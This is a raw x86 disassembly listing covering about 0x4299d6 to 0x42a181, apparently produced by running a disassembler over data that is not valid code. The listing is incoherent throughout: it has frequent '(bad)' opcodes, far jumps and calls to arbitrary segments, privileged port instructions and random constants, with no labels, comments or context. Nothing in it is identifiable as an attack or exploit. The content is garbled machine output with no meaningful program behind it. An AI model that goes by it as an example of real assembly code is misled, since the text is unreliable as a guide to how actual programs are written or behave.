  4299d6:	inc    esi
  4299d7:	js     0x4299b7
  4299d9:	pop    ecx
  4299da:	mov    ah,0xd7
  4299dc:	popf   
  4299dd:	add    eax,0x51d7298c
  4299e2:	add    eax,0x8cddaf62
  4299e7:	inc    edx
  4299e8:	inc    eax
  4299e9:	push   esi
  4299ea:	inc    ebp
  4299eb:	aam    0x34
  4299ed:	jmp    0x3d47:0x200cc66a
  4299f4:	inc    esi
  4299f5:	sbb    edx,DWORD PTR [ecx+0x5a99169b]
  4299fb:	fs mov eax,ecx
  4299fe:	mov    ecx,0x27da7641
  429a03:	mov    al,ds:0x5c624fcd
  429a08:	pop    es
  429a09:	fs or  eax,0x9955f648
  429a0f:	je     0x429a7b
  429a11:	jo     0x429a24
  429a13:	es dec edi
  429a15:	call   0x706c:0xf5e1b3ce
  429a1c:	mov    ebx,0xe4cc2af3
  429a21:	xchg   esp,eax
  429a22:	out    0xaf,eax
  429a24:	arpl   dx,dx
  429a26:	and    DWORD PTR [eax+0x75],ebp
  429a29:	mov    ds:0xaf7a2d79,eax
  429a2e:	push   esi
  429a2f:	mov    bl,0x80
  429a31:	jo     0x429a87
  429a33:	jle    0x429a74
  429a35:	pop    ss
  429a36:	sub    al,0x80
  429a38:	lea    ebp,[edi-0x39]
  429a3b:	and    DWORD PTR [eax-0x3c79f8e7],0x825e87d1
  429a45:	mov    ah,0x71
  429a47:	sub    eax,0x6847d656
  429a4c:	fwait
  429a4d:	test   BYTE PTR [esi+0x3ee21d89],ah
  429a53:	int3   
  429a54:	mov    ch,0x17
  429a56:	lods   al,BYTE PTR ds:[esi]
  429a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a58:	dec    edi
  429a59:	lds    ecx,FWORD PTR ds:0xf61059f7
  429a5f:	popa   
  429a60:	mov    esp,0x4596d25f
  429a65:	das    
  429a66:	pop    eax
  429a67:	(bad)  
  429a68:	mov    al,ds:0x384ccd63
  429a6d:	imul   ebp,DWORD PTR [ecx],0x1e
  429a70:	sub    dl,BYTE PTR [ecx-0x515a91f]
  429a76:	jae    0x429a8e
  429a78:	les    ebp,FWORD PTR [eax-0x16e9a0a0]
  429a7e:	add    al,0x3f
  429a80:	mov    dh,0x49
  429a82:	out    0xdb,al
  429a84:	jnp    0x429aed
  429a86:	xor    ebp,DWORD PTR [ebp-0x24]
  429a89:	repnz mov edi,ebx
  429a8c:	std    
  429a8d:	jg     0x429a8d
  429a8f:	call   0xb6826288
  429a94:	(bad)  
  429a95:	dec    BYTE PTR [edi+edi*1+0x1a]
  429a99:	fdiv   DWORD PTR [edi-0x5e9a4614]
  429a9f:	shl    DWORD PTR [edx-0x41c1e70e],0xa2
  429aa6:	adc    al,BYTE PTR [eax]
  429aa8:	mov    esi,0x94f04530
  429aad:	push   eax
  429aae:	add    BYTE PTR [eax-0x59],al
  429ab1:	add    al,0xdc
  429ab3:	paddb  mm2,mm3
  429ab6:	xlat   BYTE PTR ds:[ebx]
  429ab7:	fnsave [ebx+edi*8-0x39]
  429abb:	push   ds
  429abc:	js     0x429ad1
  429abe:	pop    es
  429abf:	jp     0x429a42
  429ac1:	scas   eax,DWORD PTR es:[edi]
  429ac2:	cmp    al,0x55
  429ac4:	fiadd  WORD PTR [ebx+0x26efad2b]
  429aca:	es mov eax,0xd7460010
  429ad0:	push   esi
  429ad1:	stos   BYTE PTR es:[edi],al
  429ad2:	xor    eax,0x9851da03
  429ad7:	pop    edx
  429ad8:	or     eax,0x62e7209
  429add:	inc    edx
  429ade:	icebp  
  429adf:	cwde   
  429ae0:	into   
  429ae1:	int    0xc5
  429ae3:	pusha  
  429ae4:	into   
  429ae5:	add    BYTE PTR [ebp+0x1c362162],dl
  429aeb:	int    0x3c
  429aed:	and    BYTE PTR [eax+0x76308859],0x98
  429af4:	in     eax,0x6d
  429af6:	rcl    bl,1
  429af8:	cs add edi,ecx
  429afb:	fiadd  WORD PTR [eax-0x52]
  429afe:	test   eax,0x91e720f0
  429b04:	dec    ecx
  429b05:	fldenv [ebp-0x44]
  429b08:	test   eax,0x473b4044
  429b0e:	pushf  
  429b0f:	inc    ebp
  429b10:	in     al,0xac
  429b12:	icebp  
  429b13:	jp     0x429b19
  429b15:	add    DWORD PTR [ecx],ebp
  429b17:	add    ch,BYTE PTR [ebp+0x10cc910e]
  429b1d:	dec    eax
  429b1e:	outs   dx,BYTE PTR ds:[esi]
  429b1f:	nop
  429b20:	test   eax,0x30d2245
  429b25:	push   edx
  429b26:	outs   dx,BYTE PTR ds:[esi]
  429b27:	adc    DWORD PTR [eax+eiz*1-0x37bb8ad7],0x14acd900
  429b32:	ror    BYTE PTR [edx],cl
  429b34:	ds daa 
  429b36:	cmp    bl,BYTE PTR [esi+0x780782c]
  429b3c:	les    ebx,FWORD PTR [eax]
  429b3e:	shr    BYTE PTR [eax+eax*2+0x29],1
  429b42:	cwde   
  429b43:	push   ebp
  429b44:	scas   eax,DWORD PTR es:[edi]
  429b45:	(bad)  
  429b46:	cmp    ah,BYTE PTR [esi]
  429b48:	or     ecx,edi
  429b4a:	jle    0x429b2d
  429b4c:	dec    ebp
  429b4d:	retf   
  429b4e:	push   eax
  429b4f:	pop    DWORD PTR [ecx-0x42566cf5]
  429b55:	pop    ds
  429b56:	mov    ebp,0x1f9650b2
  429b5b:	shr    BYTE PTR [edx+eax*1+0x303b2831],cl
  429b62:	jns    0x429b38
  429b64:	fist   DWORD PTR [edi+0x21]
  429b67:	fdiv   QWORD PTR [ebp+0x33]
  429b6a:	jmp    0xb660:0x24f5156a
  429b71:	xlat   BYTE PTR ds:[ebx]
  429b72:	and    cl,BYTE PTR [ecx+0x46]
  429b75:	loope  0x429b89
  429b77:	call   0x42c0998c
  429b7c:	scas   eax,DWORD PTR es:[edi]
  429b7d:	mov    eax,ds:0x6da0089
  429b82:	cmp    al,0x0
  429b84:	clc    
  429b85:	xor    al,0x12
  429b87:	sbb    esp,eax
  429b89:	in     al,dx
  429b8a:	in     eax,0x79
  429b8c:	inc    eax
  429b8d:	xchg   ebp,eax
  429b8e:	test   BYTE PTR [eax],0xe4
  429b91:	jmp    0x429beb
  429b93:	jl     0x429b15
  429b95:	dec    esi
  429b96:	pop    ecx
  429b97:	je     0x429bb9
  429b99:	pop    edi
  429b9a:	test   DWORD PTR [edi+0x3314362],0x39b46531
  429ba4:	cdq    
  429ba5:	and    dl,ch
  429ba7:	pop    ss
  429ba8:	mov    bh,0x37
  429baa:	mov    dh,0xc4
  429bac:	(bad)  
  429bad:	jmp    0x3e117533
  429bb2:	mov    edi,0x7e9bd771
  429bb7:	stc    
  429bb8:	inc    ebx
  429bb9:	addr16 out dx,eax
  429bbb:	mov    ebx,0x47fb0f67
  429bc0:	js     0x429bf1
  429bc2:	or     ch,al
  429bc4:	mov    ds:0x8f860265,eax
  429bc9:	rol    edx,cl
  429bcb:	std    
  429bcc:	mov    ds:0x898f0379,eax
  429bd1:	daa    
  429bd2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429bd4:	push   eax
  429bd5:	or     bh,ah
  429bd7:	cmp    DWORD PTR [ebp+0x1b],ebp
  429bda:	sbb    ebx,DWORD PTR [ebx]
  429bdc:	jb     0x429bc0
  429bde:	les    ecx,FWORD PTR [ecx-0x4108210c]
  429be4:	idiv   esi
  429be6:	and    eax,DWORD PTR [edi-0x700a407]
  429bec:	dec    edi
  429bed:	pop    ds
  429bee:	clc    
  429bef:	int    0xbd
  429bf1:	int    0xdd
  429bf3:	push   edi
  429bf4:	retf   0x8da
  429bf7:	sub    DWORD PTR [edx],0xe0b86520
  429bfd:	and    edx,edx
  429bff:	sbb    BYTE PTR [ecx-0x7c],bh
  429c02:	xchg   eax,ebx
  429c04:	adc    BYTE PTR [edi],al
  429c06:	pop    es
  429c07:	sbb    eax,0x9198ea4a
  429c0c:	pop    edx
  429c0d:	jne    0x429c0e
  429c0f:	jb     0x429baa
  429c11:	dec    ecx
  429c12:	dec    eax
  429c13:	lods   al,BYTE PTR ds:[esi]
  429c14:	lea    eax,[esi+esi*4-0x14]
  429c18:	mov    esp,DWORD PTR [edx]
  429c1a:	sub    al,cl
  429c1c:	je     0x429c6c
  429c1e:	or     esp,eax
  429c20:	pop    edx
  429c21:	jecxz  0x429bd1
  429c23:	cmp    DWORD PTR [edx],0x13
  429c26:	rol    BYTE PTR [eax-0x13],0x94
  429c2a:	push   es
  429c2b:	sub    al,0xee
  429c2d:	add    al,0xf0
  429c2f:	pop    esi
  429c30:	or     eax,0x90a5a9f8
  429c35:	pop    edx
  429c36:	adc    BYTE PTR [ecx],bh
  429c38:	and    DWORD PTR fs:[eax+eax*4+0x38665f5a],esi
  429c40:	out    dx,eax
  429c41:	add    DWORD PTR [esi+0x0],0x22303807
  429c48:	xor    DWORD PTR [eax+0x38593803],ecx
  429c4e:	nop
  429c4f:	add    al,al
  429c51:	lea    edx,[ecx+0x73]
  429c54:	mov    bh,0x48
  429c56:	mov    DWORD PTR [ecx-0x563ee5dc],edx
  429c5c:	(bad)  
  429c5f:	cmp    ch,dh
  429c61:	inc    ebx
  429c62:	and    DWORD PTR [eax],eax
  429c64:	add    DWORD PTR [edx+0x17642831],ebx
  429c6a:	mov    esi,0x3b0ead08
  429c6f:	and    eax,0xa066740
  429c74:	stos   DWORD PTR es:[edi],eax
  429c75:	dec    DWORD PTR [ebx-0x6]
  429c78:	mov    edx,0xa1c6c170
  429c7d:	mov    al,BYTE PTR [ecx+0xa]
  429c80:	push   0x20902a46
  429c85:	adc    al,0xa2
  429c87:	push   edx
  429c88:	mov    dl,0x6c
  429c8a:	add    eax,esp
  429c8c:	imul   edi,DWORD PTR [edi],0x3
  429c8f:	cmp    al,0xd8
  429c91:	pop    es
  429c92:	jo     0x429cfa
  429c94:	mov    WORD PTR [esi],ds
  429c96:	js     0x429cb6
  429c98:	add    al,0x23
  429c9a:	aam    0x93
  429c9c:	adc    BYTE PTR [esi*4-0x8ab418a],0xa1
  429ca4:	sub    BYTE PTR [edx],ch
  429ca6:	fisubr WORD PTR [edi]
  429ca8:	rol    ch,1
  429caa:	in     eax,dx
  429cab:	out    dx,eax
  429cac:	jo     0x429c67
  429cae:	xchg   edx,eax
  429caf:	xchg   esi,eax
  429cb0:	sbb    eax,0xce5d0278
  429cb5:	ficomp WORD PTR [esi-0x5f518499]
  429cbb:	sti    
  429cbc:	or     al,0xfd
  429cbe:	lods   eax,DWORD PTR ds:[esi]
  429cbf:	mov    dh,0x43
  429cc1:	(bad)  
  429cc2:	fsubrp st(1),st
  429cc4:	and    BYTE PTR [ecx-0x16],0x3c
  429cc8:	scas   al,BYTE PTR es:[edi]
  429cc9:	cwde   
  429cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ccb:	scas   eax,DWORD PTR es:[edi]
  429ccc:	in     al,dx
  429ccd:	mov    bl,0x50
  429ccf:	popa   
  429cd0:	out    0xcc,eax
  429cd2:	xchg   esi,eax
  429cd3:	test   bl,al
  429cd5:	(bad)  
  429cd6:	push   ebx
  429cd7:	xchg   edi,eax
  429cd8:	push   ds
  429cd9:	cld    
  429cda:	shr    BYTE PTR [edi-0x40240623],0xfa
  429ce1:	mov    ebp,ebp
  429ce3:	repz addr16 pop ebx
  429ce6:	sti    
  429ce7:	(bad)  
  429ce8:	ret    
  429ce9:	adc    bl,BYTE PTR [edi-0x13]
  429cec:	mov    dl,0xea
  429cee:	out    dx,eax
  429cef:	sbb    eax,0xacbf147a
  429cf4:	xchg   esi,eax
  429cf5:	mov    WORD PTR [esi+0x5d],ds
  429cf8:	jge    0x429ca8
  429cfa:	sbb    BYTE PTR [edx-0x72],0x2d
  429cfe:	call   0xd96fd3c2
  429d03:	pop    es
  429d04:	xor    dh,0x11
  429d07:	jl     0x429cc7
  429d09:	dec    edx
  429d0a:	loopne 0x429d55
  429d0c:	fisttp DWORD PTR ds:0x2f6ef9f8
  429d12:	jg     0x429d0d
  429d14:	retf   
  429d15:	shl    ecx,cl
  429d17:	xchg   ebp,eax
  429d18:	pop    es
  429d19:	das    
  429d1a:	jge    0x429d1b
  429d1c:	(bad)  
  429d1e:	mov    bh,BYTE PTR [edi+0x30]
  429d21:	sbb    DWORD PTR [ebp+0x33ba717f],ecx
  429d27:	retf   
  429d28:	int    0xbc
  429d2a:	inc    ecx
  429d2b:	(bad)  [esi]
  429d2d:	mov    ah,0x4d
  429d2f:	mov    ebx,esp
  429d31:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  429d33:	cwde   
  429d34:	adc    edx,ebx
  429d36:	loop   0x429cea
  429d38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d39:	add    BYTE PTR [eax],al
  429d3b:	push   ds
  429d3c:	dec    edi
  429d3d:	dec    ecx
  429d3e:	inc    esp
  429d3f:	inc    ecx
  429d40:	push   esp
  429d41:	arpl   WORD PTR [esi+edi*1+0x1],dx
  429d45:	stos   DWORD PTR es:[edi],eax
  429d46:	mov    edx,0xb7e392a3
  429d4b:	mov    cl,0x56
  429d4d:	into   
  429d4e:	jnp    0x429dc5
  429d50:	xchg   ecx,eax
  429d51:	pop    es
  429d52:	repz out 0x4,eax
  429d55:	mov    al,0x69
  429d57:	shr    BYTE PTR [edx+0x45d2c590],0x39
  429d5e:	jmp    0x429dd8
  429d60:	sub    al,0xb1
  429d62:	int3   
  429d63:	inc    edx
  429d64:	outs   dx,BYTE PTR ds:[esi]
  429d65:	xor    bl,dl
  429d67:	jns    0x429ceb
  429d69:	adc    eax,DWORD PTR [edi]
  429d6b:	inc    esp
  429d6c:	xchg   esp,ebx
  429d6e:	push   0x56e52d6a
  429d73:	pop    ebx
  429d74:	jnp    0x429dc9
  429d76:	mov    edi,DWORD PTR [edi+ebp*2]
  429d79:	nop
  429d7a:	neg    DWORD PTR [edx]
  429d7c:	in     al,0xe9
  429d7e:	sbb    al,0xb9
  429d80:	mov    DWORD PTR [eax+0x66],ecx
  429d83:	cmp    al,0x44
  429d85:	dec    eax
  429d86:	jns    0x429dc0
  429d88:	or     eax,DWORD PTR [eax-0x19]
  429d8b:	add    esp,DWORD PTR [eax]
  429d8d:	(bad)  
  429d8e:	in     eax,0x86
  429d90:	add    BYTE PTR [edi+0x15],al
  429d93:	or     al,BYTE PTR [ecx]
  429d95:	mov    edi,0x8d8e0e73
  429d9a:	mov    ebp,0x4e45b008
  429d9f:	call   0xfd430766
  429da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429da5:	sbb    ebx,ebp
  429da7:	and    DWORD PTR [ebx+0x298b3168],edx
  429dad:	or     eax,0x8395d186
  429db2:	ins    DWORD PTR es:[edi],dx
  429db3:	sbb    cl,BYTE PTR [esi-0x77]
  429db6:	out    dx,eax
  429db7:	popf   
  429db8:	sar    BYTE PTR [edi-0x6f],cl
  429dbb:	jmp    0xbd8e:0x47e9b600
  429dc2:	push   edx
  429dc3:	call   0x1cc:0x1e760f39
  429dca:	push   cs
  429dcb:	adc    eax,0x18f054bc
  429dd0:	ret    
  429dd1:	push   ebx
  429dd2:	add    eax,0xf72b0147
  429dd7:	mov    esp,0x846b7118
  429ddc:	leave  
  429ddd:	cli    
  429dde:	or     ah,al
  429de0:	mov    WORD PTR [esi],?
  429de2:	stos   BYTE PTR es:[edi],al
  429de3:	mov    ds:0x533e8ed4,al
  429de8:	sbb    ah,BYTE PTR [ebp+0x62]
  429deb:	adc    dl,BYTE PTR [ebx]
  429ded:	or     cl,BYTE PTR [edi-0x61]
  429df0:	mov    dh,0x29
  429df2:	fwait
  429df3:	mov    al,ds:0x92b32a17
  429df8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429df9:	sub    al,0x9e
  429dfb:	dec    ebp
  429dfc:	adc    DWORD PTR [eax-0x39],ebp
  429dff:	lock sahf 
  429e01:	adc    BYTE PTR [edx+0x3da8e70d],al
  429e07:	jl     0x429db9
  429e09:	scas   al,BYTE PTR es:[edi]
  429e0a:	retf   0x2242
  429e0d:	pop    ebx
  429e0e:	mov    edx,0x9533ed07
  429e13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429e14:	mov    WORD PTR [ecx-0x4bf33c00],ss
  429e1a:	bound  edx,QWORD PTR [ebx]
  429e1c:	jnp    0x429da9
  429e1e:	loop   0x429e81
  429e20:	(bad)  
  429e21:	out    dx,al
  429e22:	stc    
  429e23:	popf   
  429e24:	pop    esp
  429e25:	sbb    eax,0xfd3b3fe5
  429e2a:	icebp  
  429e2b:	(bad)  
  429e2d:	(bad)  
  429e2e:	mov    bh,0xff
  429e30:	retf   0x7fcf
  429e33:	jb     0x429e30
  429e35:	cld    
  429e36:	fldenv [edx-0xb]
  429e39:	sbb    DWORD PTR [ebp-0x2f],edi
  429e3c:	xor    ch,BYTE PTR ds:0x63c18c79
  429e42:	aaa    
  429e43:	mov    eax,0xb97dc2f1
  429e48:	stc    
  429e49:	add    ebx,DWORD PTR [esi]
  429e4b:	mov    ebx,0x3f0d67c1
  429e50:	arpl   WORD PTR [ecx+0x9],dx
  429e53:	sub    al,0xfe
  429e55:	call   DWORD PTR [edi+0x1e329ede]
  429e5b:	shl    BYTE PTR [eax-0x5],0xc9
  429e5f:	lahf   
  429e60:	cld    
  429e61:	dec    ecx
  429e62:	jns    0x429e55
  429e64:	mov    ebx,DWORD PTR [edi+0x3c]
  429e67:	std    
  429e68:	mov    gs,WORD PTR [edi-0x1]
  429e6b:	neg    BYTE PTR [edi]
  429e6d:	jg     0x429e66
  429e6f:	sti    
  429e70:	push   esi
  429e71:	out    dx,eax
  429e72:	mov    esi,0x35ef797c
  429e77:	jns    0x429e9b
  429e79:	and    edi,DWORD PTR [edi]
  429e7b:	jb     0x429ea1
  429e7d:	and    dh,BYTE PTR [eax+0x49]
  429e80:	and    al,0xb4
  429e83:	cdq    
  429e84:	and    ebp,DWORD PTR [ecx+0x7]
  429e87:	pop    ebx
  429e88:	mov    DWORD PTR [ecx],0x429e18ef
  429e8e:	pop    ss
  429e8f:	push   edi
  429e90:	(bad)  
  429e91:	push   0xb4590f44
  429e96:	into   
  429e97:	mov    BYTE PTR [esp+edx*2+0x2969186c],0x84
  429e9f:	xchg   ecx,eax
  429ea0:	push   edx
  429ea1:	pop    edi
  429ea2:	fidivr DWORD PTR cs:[edx-0x24]
  429ea6:	sbb    DWORD PTR ss:[ebx],esp
  429ea9:	iret   
  429eaa:	inc    eax
  429eab:	jmp    0x429e2e
  429ead:	and    BYTE PTR es:[edx],0x23
  429eb1:	and    esp,DWORD PTR [ebx]
  429eb3:	jae    0x429ec0
  429eb5:	add    DWORD PTR fs:[ecx+0x4],ecx
  429eb9:	cmp    eax,eax
  429ebb:	in     eax,0x4a
  429ebd:	mov    ebp,0xcca40c80
  429ec2:	lock pushf 
  429ec4:	add    BYTE PTR [eax],dh
  429ec6:	xor    ch,BYTE PTR [edx+ebp*1-0x6e]
  429eca:	or     BYTE PTR [esi+ecx*2],al
  429ecd:	retf   
  429ece:	push   0x1
  429ed0:	jge    0x429f01
  429ed2:	jmp    0xef8fb357
  429ed7:	xchg   ebp,eax
  429ed8:	mov    ch,0x69
  429eda:	xor    DWORD PTR [esi-0x7f],ebp
  429edd:	lods   al,BYTE PTR ds:[esi]
  429ede:	sbb    eax,0x19dfaeb4
  429ee3:	(bad)  
  429ee4:	into   
  429ee5:	call   0xb1ec:0xecabe811
  429eec:	sub    dl,al
  429eee:	outs   dx,BYTE PTR ds:[esi]
  429eef:	mov    eax,0xc5f6c59f
  429ef4:	adc    ch,BYTE PTR [ebx-0xd188d70]
  429efa:	cmp    ecx,DWORD PTR [ebp-0x5040d213]
  429f00:	aam    0x68
  429f02:	pop    edx
  429f03:	push   eax
  429f04:	(bad)  
  429f05:	in     al,dx
  429f06:	rcr    BYTE PTR [ecx+eax*4+0x40],0xa8
  429f0b:	out    dx,al
  429f0c:	jp     0x429f2c
  429f0e:	sar    BYTE PTR [ecx+0x47578c55],cl
  429f14:	or     cl,al
  429f16:	popa   
  429f17:	mov    edx,0xa97720d7
  429f1c:	aas    
  429f1d:	hlt    
  429f1e:	(bad)  
  429f1f:	mov    esi,0xa0a5f9c4
  429f24:	addr16 sbb bh,ch
  429f27:	xchg   ebx,eax
  429f28:	xor    eax,0x486b11c
  429f2d:	cli    
  429f2e:	popf   
  429f2f:	jne    0x429fb0
  429f31:	jbe    0x429f07
  429f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429f34:	cmc    
  429f35:	or     bl,BYTE PTR [edi]
  429f37:	and    BYTE PTR [edi],cl
  429f39:	cmp    eax,0xee266302
  429f3e:	fisttp QWORD PTR [eax]
  429f40:	cmp    eax,0xdafbc6a6
  429f45:	add    dh,bl
  429f47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f48:	mov    WORD PTR [eax],gs
  429f4a:	push   esi
  429f4b:	test   BYTE PTR [ebp-0x1f],ch
  429f4e:	pusha  
  429f4f:	push   0x23
  429f51:	data16 fwait
  429f53:	cmp    esi,DWORD PTR [ebx]
  429f55:	mov    edi,0xdef5bd36
  429f5a:	push   esi
  429f5c:	fwait
  429f5d:	outs   dx,DWORD PTR ds:[esi]
  429f5e:	mov    esi,0x38efddef
  429f63:	pop    ss
  429f64:	xchg   ebp,eax
  429f65:	popf   
  429f66:	sub    BYTE PTR fs:[ebp+eax*8+0x2a],bh
  429f6b:	setg   BYTE PTR [edi]
  429f6e:	(bad)  
  429f6f:	pop    edi
  429f70:	mov    dh,0x62
  429f72:	icebp  
  429f73:	xchg   esi,edx
  429f75:	jl     0x429f50
  429f77:	push   esi
  429f78:	ficomp WORD PTR [edi+0x223cfb06]
  429f7e:	into   
  429f7f:	pop    ds
  429f80:	cmp    al,0xa6
  429f82:	and    eax,0xdbde7dcf
  429f87:	push   ebx
  429f88:	inc    esi
  429f89:	add    DWORD PTR [edx+edi*2],ecx
  429f8c:	stos   BYTE PTR es:[edi],al
  429f8d:	or     DWORD PTR [eax],eax
  429f8f:	outs   dx,BYTE PTR ds:[esi]
  429f90:	mov    edi,0xdcd976fd
  429f95:	fmul   QWORD PTR [edi+ebp*1+0x7d]
  429f99:	jmp    0x63be1ee9
  429f9e:	jl     0x429f73
  429fa0:	daa    
  429fa1:	dec    edi
  429fa2:	ins    DWORD PTR es:[edi],dx
  429fa3:	mov    ah,0xbf
  429fa5:	cmp    edi,ebx
  429fa7:	fwait
  429fa8:	cmp    eax,0x4c68726d
  429fad:	sar    DWORD PTR [ebx+0x45],0xcc
  429fb1:	mov    bl,0x83
  429fb3:	jae    0x42a00b
  429fb5:	ficomp DWORD PTR [edx]
  429fb7:	xor    al,0x75
  429fb9:	push   ebp
  429fba:	inc    esi
  429fbb:	(bad)  
  429fbc:	mov    bl,0xf7
  429fbe:	pusha  
  429fbf:	xchg   edi,eax
  429fc0:	rcr    DWORD PTR [esi+0x79],0xf6
  429fc4:	arpl   WORD PTR [eax+eiz*1+0x51],cx
  429fc8:	xchg   esp,eax
  429fc9:	ds ror DWORD PTR gs:[edx],1
  429fcd:	jnp    0x429fd0
  429fcf:	inc    esp
  429fd0:	xor    al,0xa5
  429fd2:	(bad)  
  429fd3:	scas   al,BYTE PTR es:[edi]
  429fd4:	mov    edi,0x2d4cb916
  429fd9:	add    DWORD PTR [ebx],eax
  429fdb:	ins    DWORD PTR es:[edi],dx
  429fdc:	add    eax,0xad211e5c
  429fe1:	inc    edi
  429fe2:	inc    ebp
  429fe3:	repz fild DWORD PTR [ecx+esi*4]
  429fe7:	push   ds
  429fe8:	pop    esp
  429fe9:	into   
  429fea:	pop    esi
  429feb:	retf   
  429fec:	gs inc ebp
  429fee:	add    ecx,DWORD PTR [edi+ebp*8]
  429ff1:	lods   al,BYTE PTR ds:[esi]
  429ff2:	loop   0x429fa2
  429ff4:	add    esi,0x362192dd
  429ffa:	push   ss
  429ffb:	dec    ebp
  429ffc:	dec    edx
  429ffd:	jb     0x42a01d
  429fff:	add    cl,bh
  42a001:	and    edx,DWORD PTR [eax]
  42a003:	dec    eax
  42a004:	mov    ebp,0xfe73af76
  42a009:	mov    dl,0xfa
  42a00b:	out    0x96,al
  42a00d:	push   ds
  42a00e:	fs sub ebp,esi
  42a011:	adc    DWORD PTR [edx+edi*1],edx
  42a014:	jo     0x42a053
  42a016:	or     BYTE PTR [esi+eiz*8+0xd9d08bb],dl
  42a01d:	or     ebp,edx
  42a01f:	inc    esi
  42a020:	sub    ebp,ebp
  42a022:	mov    eax,0xa82daa53
  42a027:	cmc    
  42a028:	addr16 xor eax,0x64a54446
  42a02e:	fiadd  DWORD PTR [ecx+0x41f9e829]
  42a034:	add    bl,al
  42a036:	and    DWORD PTR ds:0xe0ae18,0xf93ea871
  42a040:	sbb    al,0xe4
  42a042:	jae    0x42a02f
  42a044:	sbb    BYTE PTR [edi-0x2b65ce72],ch
  42a04a:	cwde   
  42a04b:	iret   
  42a04c:	xchg   esp,eax
  42a04d:	sub    al,0x83
  42a04f:	push   es
  42a050:	div    BYTE PTR [edx+0x7f]
  42a053:	rcl    DWORD PTR [ebp+0x7947a174],1
  42a059:	dec    ebp
  42a05a:	add    BYTE PTR [ebx-0x41],cl
  42a05d:	push   edx
  42a05e:	xlat   BYTE PTR ds:[ebx]
  42a05f:	ret    
  42a060:	shl    cl,1
  42a062:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42a064:	add    al,0x9d
  42a066:	into   
  42a067:	sub    edi,DWORD PTR [edi]
  42a069:	and    al,0x59
  42a06b:	push   0x4f
  42a06d:	cmp    eax,DWORD PTR [esi]
  42a06f:	popa   
  42a070:	fadd   DWORD PTR [esi-0x7]
  42a073:	mov    WORD PTR [edx-0x773fdbc2],ss
  42a079:	cmp    bl,bl
  42a07b:	sub    al,0x68
  42a07d:	lds    esp,FWORD PTR [esi]
  42a07f:	mov    eax,ds:0x11243d41
  42a084:	pusha  
  42a085:	imul   esp
  42a087:	push   ss
  42a088:	js     0x42a0ce
  42a08a:	out    0x62,eax
  42a08c:	jp     0x42a086
  42a08e:	sub    eax,0xb5febd77
  42a093:	out    dx,eax
  42a094:	cmp    eax,0xb6c7c77d
  42a099:	push   edx
  42a09a:	mov    al,BYTE PTR [edi]
  42a09c:	add    DWORD PTR [edi+0x7],ebp
  42a09f:	mov    ecx,0x30f1e5e6
  42a0a4:	or     al,0xe0
  42a0a6:	sar    edi,0x43
  42a0a9:	dec    edi
  42a0aa:	mov    eax,ds:0x48f09ffc
  42a0af:	add    eax,0xca38a8b1
  42a0b4:	sti    
  42a0b5:	adc    cl,BYTE PTR [esi]
  42a0b7:	or     BYTE PTR ds:0xe030df3e,ah
  42a0bd:	sub    DWORD PTR [ebx-0x8926a00],esp
  42a0c3:	fnsave [edi-0x61]
  42a0c6:	ins    BYTE PTR es:[edi],dx
  42a0c7:	outs   dx,DWORD PTR ds:[esi]
  42a0c8:	outs   dx,DWORD PTR ds:[esi]
  42a0c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a0ca:	adc    esp,DWORD PTR [edi]
  42a0cc:	dec    esi
  42a0cd:	jl     0x42a0c3
  42a0cf:	cli    
  42a0d0:	imul   ebx,DWORD PTR [edi-0x8],0xffffffcd
  42a0d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a0d5:	iret   
  42a0d6:	lahf   
  42a0d7:	clc    
  42a0d8:	in     eax,0xbd
  42a0da:	int    0xe9
  42a0dc:	mov    bh,0xd6
  42a0de:	sub    esi,DWORD PTR ds:0x59f0707c
  42a0e4:	inc    ecx
  42a0e5:	xor    ah,BYTE PTR ds:0x85c8cd10
  42a0eb:	dec    esp
  42a0ec:	ret    0xa9
  42a0ef:	mov    cl,0x14
  42a0f1:	ja     0x42a148
  42a0f3:	adc    ebx,esi
  42a0f5:	cwde   
  42a0f6:	and    dh,BYTE PTR [edx+0x2b]
  42a0f9:	and    BYTE PTR [edx+0x7404bd2a],dh
  42a0ff:	pushf  
  42a100:	add    ah,BYTE PTR [ebp+0x4a6a06a8]
  42a106:	retf   
  42a107:	mov    ah,0x1e
  42a109:	(bad)  
  42a10a:	push   ds
  42a10b:	jno    0x42a0fb
  42a10d:	push   eax
  42a10e:	jp     0x42a103
  42a110:	mov    ds:0x3030fc21,eax
  42a115:	sub    eax,0xb4430451
  42a11a:	mov    al,0xb1
  42a11d:	sub    dl,BYTE PTR [esp+ecx*1-0x26cdcdc0]
  42a124:	xor    BYTE PTR [edi+0x11],cl
  42a127:	sub    BYTE PTR ds:0x51020ef7,0xd4
  42a12e:	iret   
  42a12f:	icebp  
  42a130:	scas   al,BYTE PTR es:[edi]
  42a131:	aam    0xf4
  42a133:	cmp    BYTE PTR ds:0x2b28390,0x53
  42a13a:	mov    DWORD PTR [esi+0x2d],eax
  42a13d:	test   BYTE PTR [ecx],ah
  42a13f:	mov    al,0x15
  42a141:	and    ebx,DWORD PTR [ecx+0x4f416420]
  42a147:	xchg   ebp,eax
  42a148:	cmp    al,0x30
  42a14a:	arpl   si,cx
  42a14c:	jne    0x42a0ea
  42a14e:	jle    0x42a12c
  42a150:	shl    DWORD PTR [edi-0x6d],1
  42a153:	mov    ecx,0xa6c1eff
  42a158:	add    ah,ah
  42a15a:	loopne 0x42a120
  42a15c:	imul   edi,DWORD PTR [edi+ecx*2+0x10360a1e],0xffffffaa
  42a164:	xchg   DWORD PTR [esi+0x40],ebp
  42a167:	cmp    al,0xbb
  42a169:	mov    ?,ecx
  42a16b:	retf   0xf504
  42a16e:	mov    eax,0x1169acc2
  42a173:	mov    ds:0x6b032879,eax
  42a178:	dec    edi
  42a179:	mov    al,0x66
  42a17b:	sub    BYTE PTR [esi-0x34fc7f7f],al
  42a181:	pop    edi
